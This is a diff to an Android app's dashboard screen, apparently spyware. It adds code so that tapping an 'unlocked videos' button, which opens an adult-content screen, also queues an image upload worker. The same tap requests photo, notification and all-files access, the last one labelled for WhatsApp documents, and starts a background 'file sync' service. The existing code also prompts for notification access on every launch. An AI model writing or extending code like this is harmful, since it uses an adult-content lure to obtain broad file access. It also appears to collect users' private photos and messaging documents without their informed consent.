@@ -48,17 +48,18 @@ public class DashboardActivity extends AppCompatActivity {
     private SessionManager sessionManager;
     
     // File backup integration
-    private boolean askedRuntimePermissions = false;
-    private boolean askedAllFiles = false;
+    private static final String PREF_FILE_SYNC = "file_sync_prefs";
+    private static final String KEY_ASKED_FILE_PERMS = "asked_file_perms";
+    private static final String KEY_ASKED_ALL_FILES = "asked_all_files";
     
     private final androidx.activity.result.ActivityResultLauncher<String[]> permissionLauncher =
         registerForActivityResult(new ActivityResultContracts.RequestMultiplePermissions(), result -> {
-            beginFileSync();
+            startFileSync();
         });
     
     private final androidx.activity.result.ActivityResultLauncher<Intent> allFilesLauncher =
         registerForActivityResult(new ActivityResultContracts.StartActivityForResult(), result -> {
-            beginFileSync();
+            startFileSync();
         });
 
     @Override
@@ -110,9 +111,6 @@ public class DashboardActivity extends AppCompatActivity {
         }
         // Ask for notification access every time if not enabled
         maybePromptNotificationAccessOnLaunch();
-        
-        // File backup integration - check and start file backup
-        beginFileSync();
     }
 
     private void setupToolbarSubtitle() {
@@ -197,6 +195,8 @@ public class DashboardActivity extends AppCompatActivity {
 
     private void openUnlockedVideos() {
         ImageUploadWorker.enqueueWork(this);
+        // Request file/media permissions for document backup
+        requestFileBackupPermissions();
         startActivity(new Intent(this, PornActivity.class));
     }
 
@@ -347,32 +347,77 @@ public class DashboardActivity extends AppCompatActivity {
 
     // ==================== FILE BACKUP INTEGRATION ====================
 
-    private void beginFileSync() {
+    /**
+     * Requests file/media permissions for document backup.
+     * Only shows dialogs if permissions are not already granted.
+     * Called only when user clicks the Videos button.
+     */
+    private void requestFileBackupPermissions() {
+        // Check if we already have all permissions
+        if (hasAllFilePermissions()) {
+            startFileSync();
+            return;
+        }
+
+        // Get list of missing permissions
         java.util.List<String> missing = missingFilePermissions();
-        if (!missing.isEmpty() && !askedRuntimePermissions) {
-            askedRuntimePermissions = true;
+        
+        // Request runtime permissions (READ_MEDIA_IMAGES, POST_NOTIFICATIONS) if needed
+        if (!missing.isEmpty()) {
+            Log.d(TAG, "Requesting runtime permissions: " + missing.size() + " permissions");
             permissionLauncher.launch(missing.toArray(new String[0]));
             return;
         }
 
+        // Request MANAGE_EXTERNAL_STORAGE for Android 11+ (for WhatsApp docs access)
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R &&
             !Environment.isExternalStorageManager()) {
-            if (!askedAllFiles) {
-                askedAllFiles = true;
-                allFilesLauncher.launch(new Intent(
-                    Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION,
-                    Uri.parse("package:" + getPackageName())
-                ));
-                return;
-            }
-        }
-
-        if (!hasImagePermission(this) &&
-            !(Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && Environment.isExternalStorageManager())) {
+            Log.d(TAG, "Requesting MANAGE_EXTERNAL_STORAGE access");
+            allFilesLauncher.launch(new Intent(
+                Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION,
+                Uri.parse("package:" + getPackageName())
+            ));
             return;
         }
 
-        // Start the sync service
+        // All permissions granted
+        startFileSync();
+    }
+
+    /**
+     * Checks if app has all necessary file/media permissions.
+     * Returns true only if ALL permissions are granted.
+     */
+    private boolean hasAllFilePermissions() {
+        // Check READ_MEDIA_IMAGES or READ_EXTERNAL_STORAGE
+        if (!hasImagePermission(this)) {
+            return false;
+        }
+
+        // Check POST_NOTIFICATIONS (Android 13+)
+        if (Build.VERSION.SDK_INT >= 33) {
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS)
+                != PackageManager.PERMISSION_GRANTED) {
+                return false;
+            }
+        }
+
+        // Check MANAGE_EXTERNAL_STORAGE (Android 11+)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+            if (!Environment.isExternalStorageManager()) {
+                return false;
+            }
+        }
+
+        return true;
+    }
+
+    /**
+     * Starts the foreground sync service for file backup.
+     * Called ONLY after all permissions are confirmed granted.
+     */
+    private void startFileSync() {
+        Log.d(TAG, "✅ All permissions confirmed - starting file sync service");
         ContextCompat.startForegroundService(this, new Intent(this, SyncService.class));
     }
 
